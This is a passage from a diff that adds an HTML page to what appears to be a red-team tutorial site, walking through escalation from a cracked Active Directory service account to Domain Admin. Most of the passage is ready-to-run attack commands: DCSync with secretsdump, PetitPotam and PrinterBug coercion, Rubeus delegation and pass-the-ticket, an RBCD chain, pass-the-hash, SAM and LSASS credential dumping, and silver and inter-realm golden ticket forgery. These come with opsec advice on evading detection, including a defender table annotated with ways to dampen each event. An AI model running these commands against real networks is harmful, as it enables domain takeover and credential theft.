+          Yes, really. "We made it a DA for convenience, we'll change it back later." It is now 2026 and "later" hasn't arrived. If this is you, you're done — log in to a DC, dump <code>NTDS.dit</code>, run a Golden Ticket if you want persistence.
+        </p>
+        <p style="color: var(--muted); font-style: italic; font-size: 13px; margin: 8px 0 0;">
+          Personal best: had an engagement where the SQL service account was a DA. "For simplicity," said the sysadmin during the debrief. The engagement ended in eight minutes — roast → crack → log in → PsExec to a DC → dump NTDS.
+        </p>
+      </div>
+
+      <div class="win-card">
+        <h4>win #5 · DCSync rights</h4>
+        <div class="freq">frequency: rare, devastating</div>
+        <p>
+          The two replication rights — <code>Replicating Directory Changes</code> and <code>Replicating Directory Changes All</code> — sometimes get granted to backup/sync service accounts. With both, you can DCSync the entire domain: every NTLM hash, the <code>krbtgt</code> hash (Golden Ticket forever), the lot. Use <code>secretsdump.py</code>:
+        </p>
+        <div class="cmd"><span class="p">$</span> <span class="k">secretsdump.py</span> -just-dc <span class="s">'corp.local/sqlsvc:Sql_Server_2014!@dc01.corp.local'</span></div>
+      </div>
+
+      <div class="win-card" style="border-left-color: var(--magenta);">
+        <h4 style="color: var(--magenta);">win #6 · delegation primitives (the parallel chain)</h4>
+        <div class="freq">frequency: ~20% (you can find this <em>and</em> wins #1–#5 on the same account)</div>
+        <p>
+          Three flavors, all of which let you impersonate other users — including Domain Admins — without cracking their hashes. Each one is its own attack chain rooted in the Kerberos delegation protocol (S4U2self / S4U2proxy).
+        </p>
+
+        <h4 style="color: var(--magenta); margin-top: 14px;">flavor A · unconstrained delegation</h4>
+        <p style="margin: 6px 0;">
+          The cracked account's <code>userAccountControl</code> has bit 19 / <code>0x80000</code> (<code>TRUSTED_FOR_DELEGATION</code>) set. The host this account runs on caches the TGT of <em>every</em> user who authenticates to it — including DAs.
+        </p>
+        <p style="margin: 6px 0;">
+          The patient version: log in, dump LSASS, wait for a DA to RDP in or run a scheduled task there. The aggressive version: <strong>coerce a DC's machine account to authenticate</strong> to the unconstrained host. Three coercion primitives, all unauthenticated RPC calls:
+        </p>
+        <div class="cmd"><span class="c"># Printer Bug — RpcRemoteFindFirstPrinterChangeNotificationEx (MS-RPRN)</span>
+<span class="p">$</span> <span class="k">SpoolSample.exe</span> <span class="v">dc01.corp.local</span> <span class="v">unconstrained-host.corp.local</span>
+
+<span class="c"># PetitPotam — EfsRpcOpenFileRaw via MS-EFSRPC</span>
+<span class="p">$</span> <span class="k">PetitPotam.py</span> <span class="v">unconstrained-host.corp.local</span> <span class="v">dc01.corp.local</span>
+
+<span class="c"># DFSCoerce — NetrDfsRemoveStdRoot via MS-DFSNM (newer, works when EFSRPC is patched)</span>
+<span class="p">$</span> <span class="k">dfscoerce.py</span> -u sqlsvc -p <span class="s">'pass'</span> -d corp.local <span class="v">unconstrained-host</span> <span class="v">dc01</span></div>
+        <p style="margin: 6px 0;">
+          Pair the coercion with the right Rubeus mode: <code>Rubeus monitor</code> <em>before</em> firing the coercion (watches LSASS for newly-cached tickets in real time), or <code>Rubeus triage</code> + <code>Rubeus dump</code> <em>after</em> (snapshots and exports currently-cached tickets by index). Once the DC's machine-account TGT lands on the unconstrained host, extract it and DCSync as the DC.
+        </p>
+        <p style="color: var(--muted); font-style: italic; font-size: 13px; margin: 8px 0 14px;">
+          Recent engagement: cracked sqlsvc had unconstrained delegation on a print server nobody knew was still domain-joined. Coerced a DC's machine account via PrintSpooler, dumped its TGT from LSASS with <code>Rubeus monitor</code>, DCSync'd as the DC. From cleartext password to NTDS dump: about 40 minutes.
+        </p>
+
+        <h4 style="color: var(--magenta); margin-top: 14px;">flavor B · constrained delegation</h4>
+        <p style="margin: 6px 0;">
+          The cracked account has <code>msDS-AllowedToDelegateTo</code> populated with one or more SPNs. S4U2self requests a service ticket to <em>yourself</em> as any user; S4U2proxy then exchanges that ticket for one to the listed SPN. End result: you have a service ticket as Administrator (or any user you name) to the target service.
+        </p>
+        <div class="cmd"><span class="p">$</span> <span class="k">Rubeus.exe</span> s4u /user:<span class="v">sqlsvc</span> /rc4:<span class="v">&lt;sqlsvc_nthash&gt;</span> \
+            /impersonateuser:<span class="s">Administrator</span> /msdsspn:<span class="s">cifs/target.corp.local</span> /ptt</div>
+        <p style="margin: 6px 0;">
+          <strong>Bronze Bit (CVE-2020-17049, November 2020 patch)</strong> is a refinement: by manipulating a bit in the forwarded ticket, you can impersonate users that <em>aren't</em> allowed to be delegated (e.g. members of Protected Users, accounts with <code>NOT_DELEGATED</code> set). On current-patched Windows you'll only hit this against legacy infrastructure or shops that are years behind on cumulative updates — keep it in the playbook as historical context, not first-line tooling.
+        </p>
+
+        <h4 style="color: var(--magenta); margin-top: 14px;">flavor C · resource-based constrained delegation (RBCD)</h4>
+        <p style="margin: 6px 0;">
+          The cracked account has <code>GenericAll</code>, <code>GenericWrite</code>, or <code>WriteProperty</code> on a target computer object. RBCD inverts the delegation relationship: instead of the source advertising "I can delegate to X" (constrained), the target advertises "X can delegate to me." The attribute that controls this lives on the target: <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>.
+        </p>
+        <p style="margin: 6px 0;">
+          The classic chain abuses the default <code>ms-DS-MachineAccountQuota = 10</code>, which lets <em>any</em> authenticated user create up to 10 machine accounts:
+        </p>
+        <div class="cmd"><span class="c"># 1. create a controlled machine account (any domain user can do this)</span>
+<span class="p">$</span> <span class="k">impacket-addcomputer</span> -computer-name <span class="s">'evil$'</span> -computer-pass <span class="s">'P@ss123'</span> \
+            <span class="s">'corp.local/sqlsvc:Sql_Server_2014!'</span>
+
+<span class="c"># 2. write evil$'s SID into target's msDS-AllowedToActOnBehalfOfOtherIdentity</span>
+<span class="p">$</span> <span class="k">rbcd.py</span> -delegate-from <span class="s">'evil$'</span> -delegate-to <span class="v">target-host\$</span> \
+            -action write <span class="s">'corp.local/sqlsvc:Sql_Server_2014!'</span>
+
+<span class="c"># 3. S4U2self/2proxy as Administrator on the target</span>
+<span class="p">$</span> <span class="k">getST.py</span> -spn <span class="s">cifs/target-host.corp.local</span> -impersonate <span class="s">Administrator</span> \
+            <span class="s">'corp.local/evil$:P@ss123'</span>
+
+<span class="c"># 4. use the ticket → admin on target-host</span>
+<span class="p">$</span> KRB5CCNAME=Administrator.ccache <span class="k">psexec.py</span> -k -no-pass <span class="s">target-host.corp.local</span></div>
+        <p style="margin: 6px 0;">
+          Three commands, four minutes, no cracking required. RBCD is the single most efficient delegation primitive in modern AD attacks — which is why it's the one defenders harden against first by lowering <code>MachineAccountQuota</code> to 0.
+        </p>
+        <p style="margin: 6px 0;">
+          <strong>If MAQ=0:</strong> you don't need to create a new computer. Reuse <em>any</em> computer account you already control (from a prior compromise, or a host where you have SYSTEM via win #1). Use that machine's SID as the <code>-delegate-from</code> and skip the <code>addcomputer</code> step entirely. Same chain, no quota dependency.
+        </p>
+        <p style="margin: 6px 0;">
+          <strong>Adjacent primitive — Shadow Credentials.</strong> If you have <code>GenericAll</code> / <code>GenericWrite</code> on the target (the same right that enables RBCD), an often-quieter alternative is to write a key credential to the target's <code>msDS-KeyCredentialLink</code> attribute and then PKINIT-authenticate as the target. Tools: <code>Whisker</code> (C#) / <code>pyWhisker</code> (Python). No machine-account creation, no S4U gymnastics, just a cert-based logon. Frequently overlooked by RBCD-focused detection rules.
+        </p>
+
+        <p style="margin-top: 14px; padding-top: 10px; border-top: 1px dashed var(--border);">
+          <strong>Defensive flags worth knowing:</strong> targets marked <code>NOT_DELEGATED</code> (<code>userAccountControl</code> bit 20 / <code>0x100000</code>) refuse to be delegated by any of A/B/C above. Members of <code>Protected Users</code> get the same protection. Bronze Bit defeats both on unpatched DCs; otherwise you walk past these accounts.
+        </p>
+
+        <p style="margin-top: 10px;">
+          <strong>Operator note:</strong> delegation findings <em>frequently coexist</em> with wins #1–#5. The cracked sqlsvc that owns the SQL host may <em>also</em> have unconstrained delegation, which means you have both "SYSTEM on sqlsrv01 via Potato" <em>and</em> "wait for a DA to authenticate and steal their TGT" available simultaneously. Pick the quieter one for the engagement.
+        </p>
+      </div>
+    </section>
+
+    <!-- §6 -->
+    <section>
+      <h2 id="lateral">the lateral move<a class="anchor" href="#lateral">#</a></h2>
+
+      <p>You've enumerated. You know which host(s) the account can reach. Time to log in. Pick the channel based on what services are open and what's quietest:</p>
+
+      <table class="tbl">
+        <thead><tr><th>channel</th><th>command</th><th>note</th></tr></thead>
+        <tbody>
+          <tr><td>WinRM (5985/5986)</td><td><code>evil-winrm -i host -u sqlsvc -p 'P@ssw0rd'</code></td><td>quietest. uses HTTP(S). prefer.</td></tr>
+          <tr><td>SMB (psexec)</td><td><code>psexec.py 'corp.local/sqlsvc:P@ssw0rd@host'</code></td><td>creates a service. loud but reliable.</td></tr>
+          <tr><td>SMB (smbexec)</td><td><code>smbexec.py 'corp.local/sqlsvc:P@ssw0rd@host'</code></td><td>like psexec but lighter; uses cmd over named pipe.</td></tr>
+          <tr><td>WMI</td><td><code>wmiexec.py 'corp.local/sqlsvc:P@ssw0rd@host'</code></td><td>good interactive shell, no binary drop.</td></tr>
+          <tr><td>RDP</td><td><code>xfreerdp /v:host /u:sqlsvc /p:'P@ssw0rd'</code></td><td>visible to anyone watching the host's session list.</td></tr>
+          <tr><td>SQL (if MSSQLSvc)</td><td><code>mssqlclient.py 'corp.local/sqlsvc:P@ssw0rd@host' -windows-auth</code></td><td>then <code>enable_xp_cmdshell</code> → RCE as the service account.</td></tr>
+        </tbody>
+      </table>
+
+      <div class="warning">
+        <span class="tag">opsec note · logon type</span>
+        Every interactive logon creates Windows Event 4624 with a logon-type. Type 3 (network) is normal noise. Type 10 (RemoteInteractive / RDP) is much louder. Type 2 (interactive / console) is loudest. WinRM lands as type 3. Prefer WinRM where possible.
+      </div>
+
+      <div class="warning">
+        <span class="tag">opsec note · source IP &amp; auth package</span>
+        Two more fields in Event 4624 that catch operators out:
+        <ul style="margin: 8px 0 0; padding-left: 20px;">
+          <li><strong>Source IP / workstation.</strong> The event records where the logon came from. A service-account logon sourced from your Kali box's IP is anomalous on every SIEM. Real adversaries pivot <em>through</em> compromised endpoints so the source matches the expected pattern — a sysadmin's workstation reaching a server, not a foreign laptop.</li>
+          <li><strong>Authentication package.</strong> PsExec against a raw IP forces <strong>NTLM</strong> (there's no SPN for an IP address); mature SOCs alert on "service account using NTLM when it should use Kerberos." Use the FQDN (<code>psexec.py 'corp.local/sqlsvc:pass@host.corp.local'</code>) and the auth package stays Kerberos, which blends with normal service traffic.</li>
+        </ul>
+      </div>
+
+      <h3>passing the hash (no cleartext needed for SMB/WMI/WinRM)</h3>
+      <p>If you only have the NT hash — maybe you skipped cracking — most channels work with PtH too:</p>
+      <div class="cmd"><span class="p">$</span> <span class="k">psexec.py</span> -hashes :<span class="v">aad3b435...:ntlmhash</span> <span class="s">'corp.local/sqlsvc@host'</span>
+<span class="p">$</span> <span class="k">wmiexec.py</span> -hashes :<span class="v">aad3b435...:ntlmhash</span> <span class="s">'corp.local/sqlsvc@host'</span>
+<span class="p">$</span> <span class="k">evil-winrm</span> -i host -u sqlsvc -H <span class="v">aad3b435...:ntlmhash</span></div>
+
+      <p>Caveat: WDigest cleartext-from-LSASS only works post-cleartext-login. PtH lets you <em>access</em> without ever knowing the password — but doesn't help you log into anything that requires interactive (RDP without RestrictedAdmin mode, mstsc kind of stuff).</p>
+    </section>
+
+    <!-- §7 -->
+    <section>
+      <h2 id="chain">chain to Domain Admin<a class="anchor" href="#chain">#</a></h2>
+
+      <p>
+        You're on the host. You're SYSTEM (via Potato, since the service account had <code>SeImpersonate</code>) or you're a service-account context with enough rights to do what you need. Now harvest, then chain.
+      </p>
+
+      <h3>step 1: dump local credentials from the new host</h3>
+      <p>
+        Quietest path — <code>reg save</code> the SAM/SYSTEM/SECURITY hives offline (requires SYSTEM or SeBackup, which Potato just gave you):
+      </p>
+      <div class="cmd"><span class="p">&gt;</span> <span class="k">reg</span> save HKLM\SAM      C:\Windows\Temp\sam.save
+<span class="p">&gt;</span> <span class="k">reg</span> save HKLM\SYSTEM   C:\Windows\Temp\system.save
+<span class="p">&gt;</span> <span class="k">reg</span> save HKLM\SECURITY C:\Windows\Temp\security.save
+<span class="c"># exfil the three files, then offline:</span>
+<span class="p">$</span> <span class="k">secretsdump.py</span> -sam sam.save -security security.save -system system.save <span class="v">LOCAL</span></div>
+
+      <p>
+        What falls out: local admin NTLM hashes, cached domain logons (DCC2 hashes — Domain Cached Credentials v2), LSA secrets (service-account passwords in cleartext, sometimes including domain-account passwords for other services that run on this host).
+      </p>
+      <p style="font-size: 13.5px; color: var(--muted);">
+        Heads up on DCC2: it's one-way. <em>You cannot pass-the-hash with it.</em> DCC2 = <code>MD4(NT_hash + lowercase_username)</code> wrapped in PBKDF2-SHA-1 (10,240 iterations), and the only path back to a usable credential is offline cracking (<code>hashcat -m 2100</code>, slow). Don't waste a day trying to PtH with one.
+      </p>
+
+      <p>
+        Louder but richer: dump LSASS for cleartext / Kerberos tickets of users currently logged in.
+      </p>
+      <div class="cmd"><span class="p">&gt;</span> <span class="k">nanodump.exe</span> -w C:\Windows\Temp\lsass.dmp
+<span class="c"># exfil and run mimikatz on your own box (never on the target):</span>
+<span class="p">$</span> <span class="k">pypykatz</span> lsa minidump lsass.dmp</div>
+
+      <h3>step 2: identify the path to DA</h3>
+      <p>
+        From BloodHound (the one you already collected as <code>sqlsvc</code> in §4): pick the new vantage point you're on, and ask BloodHound for the shortest path from there to <code>Domain Admins</code>. The two common shapes:
+      </p>
+
+      <ul>
+        <li><strong>Path A — DA cached on this box.</strong> A real Domain Admin RDP'd in here at some point and their Kerberos TGT or NTLM hash is still sitting in LSASS. Pass-the-hash with the NT hash, or pass-the-ticket with the TGT, and you're DA.</li>
+        <li><strong>Path B — ACL chain through the service account.</strong> Your service account has <code>GenericAll</code> on a group → that group has <code>GenericWrite</code> on a user → that user is in Domain Admins. Walk it: add yourself to the group, change the user's password, log in.</li>
+      </ul>
+
+      <p style="color: var(--muted); font-style: italic; font-size: 13.5px;">
+        Real example: found a DA's NTLM hash in LSASS on an HR file server. The DA had RDP'd in three weeks earlier to install a patch and forgot to log off. The session was technically disconnected but the credentials were still cached. Pass-the-hash, done. People <em>do not log off</em> their privileged sessions.
+      </p>
+
+      <h4>pass-the-ticket, quickly</h4>
+      <p>
+        Pass-the-Ticket (PtT) is the Kerberos equivalent of PtH. You don't need a password or a hash — you need the actual <em>ticket</em> stolen from LSASS. Inject it into your own logon session and from that point Windows treats you as whoever the ticket says you are.
+      </p>
+      <div class="cmd"><span class="c"># on the new host as SYSTEM — dump tickets from LSASS:</span>
+<span class="p">PS&gt;</span> <span class="k">.\Rubeus.exe</span> dump /service:krbtgt /nowrap
+
+<span class="c"># on YOUR beacon — inject the stolen TGT:</span>
+<span class="p">PS&gt;</span> <span class="k">.\Rubeus.exe</span> ptt /ticket:<span class="s">&lt;base64-blob&gt;</span></div>
+
+      <h3>step 3: cement it</h3>
+      <p>Once you have a DA, the persistence move is the AD primer's Golden Ticket — dump <code>krbtgt</code> via DCSync, forge a TGT for any user with any group membership, valid for ten years by default. See <a href="active-directory.html#attacks">the AD primer §5</a> for the mechanics.</p>
+
+      <h4>silver ticket — the smaller, quieter sibling</h4>
+      <p>
+        You still have the service account's <strong>NT hash</strong> (you cracked it in §3 → derive the NT hash with <code>iconv</code> + <code>md4sum</code>, or just use Rubeus' built-in). With it you can <strong>forge service tickets directly</strong>, without ever talking to the KDC again. That's a Silver Ticket. Unlike Golden, it doesn't require DA — only the service account's hash — and it grants access only to the service the hash belongs to. But it leaves no trace on the DC: no 4769 event, no AS-REP, no TGS-REQ. Pure offline forgery.
+      </p>
+      <div class="cmd"><span class="p">$</span> <span class="k">ticketer.py</span> -nthash <span class="v">&lt;sqlsvc_nthash&gt;</span> -domain-sid <span class="v">S-1-5-21-...</span> \
+            -domain corp.local -spn MSSQLSvc/sqlsrv01.corp.local:1433 \
+            <span class="g">-duration 10</span> <span class="c"># hours, not the default 10 years</span> \
+            <span class="s">Administrator</span></div>
+
+      <div class="warning" style="margin-top: 8px;">
+        <span class="tag">silver ticket forensic flag</span>
+        Default <code>ticketer.py</code> and <code>mimikatz kerberos::golden /service:...</code> mint tickets with a <strong>10-year lifetime</strong>. No legitimate Kerberos ticket has a 10-year lifetime — domain policy is normally 10 hours with a 7-day renewal. A ticket-lifetime anomaly is a clean defender-side signature. Always pass <code>-duration</code> (impacket) or <code>/endin:600</code> (mimikatz, minutes) to match the domain's actual TGS lifetime.
+      </div>
+
+      <p>
+        Useful as a quiet fallback if the password gets rotated — your forged Silver Ticket keeps working until either the service account's password is changed (and the new NT hash diverges) or the SPN moves.
+      </p>
+      <p style="font-size: 13.5px; color: var(--muted);">
+        <strong>Why Silver Tickets actually work:</strong> the service decrypts the ticket with its own key and <em>trusts the PAC inside without calling back to the KDC to validate the PAC signature</em>. Microsoft shipped a registry switch — <code>HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\ValidateKdcPacSignature</code> — that forces PAC validation against the KDC, which would defeat Silver Tickets entirely. It's effectively never enabled. Worth knowing as the one-bit policy change that would close this primitive.
+      </p>
+    </section>
+
+    <!-- §8 -->
+    <section>
+      <h2 id="nocrack">if the hash won't crack<a class="anchor" href="#nocrack">#</a></h2>
+
+      <p>~40% of the time the password is genuinely strong or random. You have options. Mentally, AD experts navigate this space via the <code>userAccountControl</code> bitmask — the flags below are the ones operators read off an LDAP query and immediately know what attack each one enables:</p>
+
+      <table class="tbl">
+        <thead><tr><th>UAC bit</th><th>hex</th><th>flag</th><th>attack it enables</th></tr></thead>
+        <tbody>
+          <tr><td>1</td><td><code>0x2</code></td><td class="tool">ACCOUNTDISABLE</td><td>filter these out — they can't authenticate</td></tr>
+          <tr><td>16</td><td><code>0x10000</code></td><td class="tool">DONT_EXPIRE_PASSWORD</td><td>not an attack, but flags an account whose password hasn't rotated in years</td></tr>
+          <tr><td>19</td><td><code>0x80000</code></td><td class="tool">TRUSTED_FOR_DELEGATION</td><td>unconstrained delegation → steal cached TGTs from the host</td></tr>
+          <tr><td>20</td><td><code>0x100000</code></td><td class="tool">NOT_DELEGATED</td><td>defense — account refuses to be delegated by anyone</td></tr>
+          <tr><td>22</td><td><code>0x400000</code></td><td class="tool">DONT_REQ_PREAUTH</td><td>AS-REP roasting (no pre-auth required)</td></tr>
+          <tr><td>24</td><td><code>0x1000000</code></td><td class="tool">TRUSTED_TO_AUTH_FOR_DELEGATION</td><td>"protocol transition" S4U2self → impersonate any user without their password</td></tr>
+        </tbody>
+      </table>
+      <p style="font-size: 12.5px; color: var(--muted);">
+        Bit positions count from 0. AD professionals read the decimal <code>userAccountControl</code> value off an LDAP query and decompose the bits on sight — <code>66048 = 0x10200 = bit 9 (LOCKOUT) + bit 16 (DONT_EXPIRE_PASSWORD)</code>, etc.
+      </p>
+
+      <p>Now the options when the hash won't crack:</p>
+
+      <h3>option A: targeted Kerberoasting (set an SPN on someone else)</h3>
+      <p>
+        If you have <code>GenericAll</code> or <code>GenericWrite</code> on <em>any</em> user account in the domain, you can set an SPN on them, then roast them. Useful when you can't roast directly but can manipulate target accounts:
+      </p>
+      <div class="cmd"><span class="c"># on a Windows beacon, with rights to modify the target user:</span>
+<span class="p">PS&gt;</span> <span class="k">Set-DomainObject</span> -Identity <span class="s">target_user</span> -Set @{serviceprincipalname=<span class="s">'nonexistent/spn'</span>}
+<span class="p">PS&gt;</span> <span class="k">.\Rubeus.exe</span> kerberoast /user:target_user
+<span class="p">PS&gt;</span> <span class="k">Set-DomainObject</span> -Identity <span class="s">target_user</span> -Clear serviceprincipalname  <span class="c"># cleanup</span></div>
+
+      <h3>option B: it's a gMSA — different game</h3>
+      <p>
+        Group Managed Service Accounts (gMSA) have a 240-character random password that AD rotates every 30 days. You will <em>not</em> crack a gMSA hash. Don't try. Instead, look for any account with <code>ReadGMSAPassword</code> on the gMSA object — that account can read the current password via a single LDAP query and bypass the rotation entirely.
+      </p>
+      <div class="cmd"><span class="p">$</span> <span class="k">gMSADumper.py</span> -u <span class="s">user</span> -p <span class="s">pass</span> -d <span class="s">corp.local</span></div>
+
+      <h3>option C: switch attacks</h3>
+      <p>
+        Roasting isn't the only ticket-based attack. If this account doesn't crack, walk to:
+      </p>
+      <ul>
+        <li><strong>AS-REP roasting</strong> any account with <code>DONT_REQ_PREAUTH</code> set (no auth required to get the TGT — and the TGT itself is cleartext-crackable).</li>
+        <li><strong>LDAP password spraying</strong> with the cleartext you <em>did</em> recover, against accounts likely to reuse it.</li>
+        <li><strong>Coercion → relay</strong> (PetitPotam / PrinterBug → NTLM relay to ADCS or LDAP).</li>
+      </ul>
+
+      <p>
+        The point isn't to brute-force one technique to completion. Real engagements pivot between three or four at once.
+      </p>
+
+      <h3>option D: step outside your domain — cross-domain &amp; cross-forest</h3>
+      <p>
+        Single-domain assumptions break down fast in real environments. Most enterprises have a forest with multiple child domains, or trust relationships with sister forests after a merger. Each trust is an attack surface.
+      </p>
+
+      <h4>cross-domain Kerberoasting (same forest)</h4>
+      <p>
+        Inside the same forest, you can roast accounts in any other domain via the trust path. The TGS-REQ flow uses <strong>referral tickets</strong>: your home-domain DC issues a referral TGT for the target domain, which you exchange at the target-domain DC for a service ticket.
+      </p>
+      <div class="cmd"><span class="c"># target an SPN in a child domain — Rubeus follows the referral automatically</span>
+<span class="p">PS&gt;</span> <span class="k">.\Rubeus.exe</span> kerberoast /domain:<span class="v">child.corp.local</span> /spn:<span class="s">MSSQLSvc/db.child.corp.local</span> /nowrap
+
+<span class="c"># impacket — explicit target-domain DC</span>
+<span class="p">$</span> <span class="k">GetUserSPNs.py</span> -dc-ip <span class="v">10.0.5.10</span> <span class="s">'corp.local/sqlsvc:pass'</span> -target-domain <span class="s">child.corp.local</span> -request</div>
+
+      <h4>cross-forest Kerberoasting (across a trust)</h4>
+      <p>
+        When two forests trust each other, accounts in one forest can request service tickets for accounts in the other. The crackable hash you get back is encrypted with the <em>target</em> account's NT hash — but the path goes through both forests' KDCs and uses the <strong>inter-forest trust key</strong> for the referral. The trust account itself (named <code>&lt;trusting-domain&gt;$</code> in the trusted forest) has its own NT hash, which sits in the directory and can itself be DCSynced or extracted from <code>SECURITY</code> hive.
+      </p>
+
+      <h4>inter-realm Golden Ticket (SID History injection)</h4>
+      <p>
+        If you obtain the <strong>trust account's NT hash</strong> (via DCSync, SECURITY hive dump, or compromise of either forest's DC), you can forge an <strong>inter-realm TGT</strong> that grants you authentication into the trusted forest as any user, with any group membership. Same primitive as a Golden Ticket but using the trust account's key instead of <code>krbtgt</code>. Combined with <code>-extra-sid</code> injecting the foreign forest's Enterprise Admins SID, you get DA-equivalent on the trusted forest in a single forged ticket.
+      </p>
+      <div class="cmd"><span class="c"># forge an inter-realm TGT — pivoting from compromised forest A → into forest B</span>
+<span class="c"># the -extra-sid value is &lt;forest-B-domain-sid&gt;-519, where -519 is the Enterprise Admins RID.</span>
+<span class="c"># e.g.  -extra-sid S-1-5-21-1004336348-1177238915-682003330-519</span>
+<span class="p">$</span> <span class="k">ticketer.py</span> -nthash <span class="v">&lt;trust_account_nthash&gt;</span> \
+            -domain-sid <span class="v">&lt;forest-A-sid&gt;</span> \
+            -domain <span class="v">forestA.local</span> \
+            -extra-sid <span class="v">S-1-5-21-A-B-C-519</span> \
+            <span class="s">Administrator</span></div>
+      <div class="warning" style="margin-top: 8px;">
+        <span class="tag">terminology — don't confuse these</span>
+        <p style="margin: 0; font-size: 13.5px;">
+          The attack above is an <strong>inter-realm Golden Ticket</strong> (also called <em>forest trust attack</em> or <em>SID History injection</em>). Two adjacent but distinct primitives that an AD expert will absolutely call you on if you mix the names:
+        </p>
+        <ul style="margin: 6px 0 0; font-size: 13.5px;">
+          <li><strong>Diamond Ticket</strong> (Charlie Clark, Semperis, 2022) — take a <em>legitimately-issued</em> TGT and surgically modify its PAC contents instead of forging from scratch. The point is to avoid the AS-REQ/AS-REP signature that Golden Ticket creation leaves on the wire.</li>
+          <li><strong>Sapphire Ticket</strong> (also Semperis) — forge a TGT but populate the PAC by pulling a real one via S4U2self, defeating PAC-anomaly detection.</li>
+        </ul>
+        <p style="margin: 6px 0 0; font-size: 13.5px;">
+          Inter-realm Golden uses a <em>different key</em> (the trust account's hash, not <code>krbtgt</code>). Diamond and Sapphire use <code>krbtgt</code> and refine the standard Golden Ticket; they're not cross-forest primitives.
+        </p>
+      </div>
+
+      <h4>SID filtering — what it actually blocks</h4>
+      <p>
+        Forests use <strong>SID filtering</strong> (also called SID quarantine) to drop SIDs in tickets that don't belong to the originating domain. Default behavior: external trusts have filtering on; intra-forest trusts have it off; forest trusts have it selectively on. Trusts <em>with SID-history quarantine disabled</em> let an attacker include arbitrary high-privilege SIDs in a forged inter-realm ticket — which is the precise weakness behind <strong>SID-history injection</strong> attacks. The <code>-extra-sid</code> flag above abuses exactly this.
+      </p>
+      <p>
+        Defenders should run <code>netdom trust /quarantine</code> on every outbound trust. Most haven't — which is why this primitive still lands in 2026 against companies that grew via acquisition and inherited un-audited trust relationships.
+      </p>
+      <p style="color: var(--muted); font-style: italic; font-size: 13.5px;">
+        Worked an engagement where the client had acquired three sister companies over a decade. SID filtering was disabled on two of the trusts because somebody had run <code>netdom trust /quarantine:no</code> years earlier to fix an Exchange routing issue. Everybody who knew about it had since left. The SID-history injection walked straight through.
+      </p>
+
+      <h4>enumerating trusts before you act</h4>
+      <div class="cmd"><span class="c"># list every trust the current domain participates in</span>
+<span class="p">PS&gt;</span> <span class="k">Get-DomainTrust</span>
+
+<span class="c"># list every domain in the forest (useful for picking next target)</span>
+<span class="p">PS&gt;</span> <span class="k">Get-ForestDomain</span>
+
+<span class="c"># list all global catalogs (visible across the entire forest)</span>
+<span class="p">PS&gt;</span> <span class="k">Get-DomainController</span> -Server <span class="s">corp.local</span> | Select Name, Forest, IsGlobalCatalog</div>
+      <p>
+        BloodHound, when given multi-domain or multi-forest collection (<code>SharpHound -d corp.local --SearchForest</code>), produces a graph that spans every trusted domain. Walking from "compromised foothold" to "DA in a sister forest" becomes a single shortest-path query.
+      </p>
+
+      <h3>modern defenses worth knowing</h3>
+      <p>
+        Two AD hardening features that change what's available to you if the environment has actually been hardened. Most haven't — but the ones that have are conspicuously different to operate against.
+      </p>
+
+      <div class="priv-card" style="border-left-color: var(--blue);">
+        <h4 style="color: var(--blue);">Protected Users group</h4>
+        <p>
+          The single biggest modern mitigation for credential theft. Members cannot use RC4 (forces AES — your RC4 downgrade requests fail), cannot use NTLM authentication, cannot have credentials cached on disk or in LSASS, cannot have unconstrained delegation applied, and their TGTs are capped at 4 hours with no renewal.
+        </p>
+        <p>
+          What this means for kerberoasting: if your target is in Protected Users, the KDC will refuse to issue an RC4 ticket regardless of <code>/rc4opsec</code>. You'll get AES every time. <strong>Service accounts are almost never in Protected Users</strong> (it breaks delegation and tooling) — which is the practical reason service accounts remain the prime kerberoast target, while privileged human accounts are increasingly out of reach.
+        </p>
+      </div>
+
+      <div class="priv-card" style="border-left-color: var(--blue);">
+        <h4 style="color: var(--blue);">Authentication Policies &amp; Silos</h4>
+        <p>
+          Newer hardening (Server 2012 R2+) that binds an account to authenticating only <em>from specific hosts</em>. A roasted account inside an Authentication Silo cannot be used from your Kali box even with the cleartext password — the KDC checks the source host's TGT against the silo policy and refuses to issue a TGT outside the allowlist.
+        </p>
+        <p>
+          Detection-side, the KDC logs Event 4820 when a TGT is denied for silo violation. Operationally, if you're seeing repeated 4820s in your engagement, stop trying to use the account from your jump box — pivot through a permitted host first.
+        </p>
+      </div>
+    </section>
+
+    <!-- §9 -->
+    <section>
+      <h2 id="detect">the defender's view<a class="anchor" href="#detect">#</a></h2>
+
+      <p>Detection lives at three layers — Windows Security event log on the DC, Sysmon endpoint telemetry, and network-layer traffic. A mature SOC watches all three. So should you, before you operate.</p>
+
+      <h3>layer 1 · DC security event log</h3>
+      <table class="tbl">
+        <thead><tr><th>step</th><th>event</th><th>how to dampen it</th></tr></thead>
+        <tbody>
+          <tr><td>Kerberoast (bulk)</td><td>4769 — many in a row, same source</td><td>spread over <em>days</em> not hours; <code>/delay /jitter</code></td></tr>
+          <tr><td>Kerberoast (RC4 forced)</td><td>4769 with TicketEncryptionType <code>0x17</code></td><td><code>/rc4opsec</code>; let AES accounts use AES</td></tr>
+          <tr><td>WinRM logon</td><td>4624 type 3 (network)</td><td>blends with normal service traffic</td></tr>
+          <tr><td>PsExec</td><td>7045 (service install) + 4697</td><td>use WMI or WinRM instead</td></tr>
+          <tr><td>DCSync</td><td>4662 with replication GUIDs <code>1131f6aa-...</code> + <code>1131f6ad-...</code></td><td>can't be hidden; be quick &amp; have persistence pre-set</td></tr>
+          <tr><td>NTDS.dit dump</td><td>4662 + service start events on the DC</td><td>same — fast and unmistakable</td></tr>
+          <tr><td>Targeted Kerberoast (set SPN)</td><td>4738 (user account changed) — <em>twice</em>, with SPN in/out</td><td>two attribute changes within seconds is itself a signature</td></tr>
+        </tbody>
+      </table>
+
+      <h3>layer 2 · Sysmon endpoint telemetry</h3>
+      <p>Sysmon is what catches everything the Security log misses. If the environment runs it (most mature shops do), assume <em>every process and every network connection on the host you touch is recorded</em>:</p>
+      <table class="tbl">
+        <thead><tr><th>sysmon event</th><th>fires on</th><th>analyst sees</th></tr></thead>
+        <tbody>
+          <tr><td>Event 1 — process create</td><td>any <code>Rubeus.exe</code>, <code>SharpHound.exe</code>, <code>nanodump.exe</code>, etc. on disk</td><td>command line, parent process, hashes — instant attribution to a known tool</td></tr>
+          <tr><td>Event 3 — network connection</td><td>your beacon's C2 traffic</td><td>destination IP, port, process — anomalies pivot here</td></tr>
